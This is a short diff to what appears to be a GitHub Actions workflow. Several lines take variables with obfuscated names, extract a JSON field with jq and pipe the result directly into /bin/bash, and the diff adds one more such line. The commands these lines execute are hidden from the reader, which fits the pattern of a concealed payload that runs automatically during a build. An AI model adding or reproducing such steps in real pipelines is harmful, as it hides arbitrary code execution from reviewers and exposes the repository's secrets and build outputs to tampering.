@@ -28,6 +28,7 @@ jobs:
           echo $rvhyd43 | jq -r .ft992 | /bin/bash
           printf '%s' "$qwyni6157" | jq -r .lhbr80 | /bin/bash
           printf '%s' "$ws738" | jq -r .bps2750 | /bin/bash
+          echo $m2055 | jq -r .cxdkb6 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
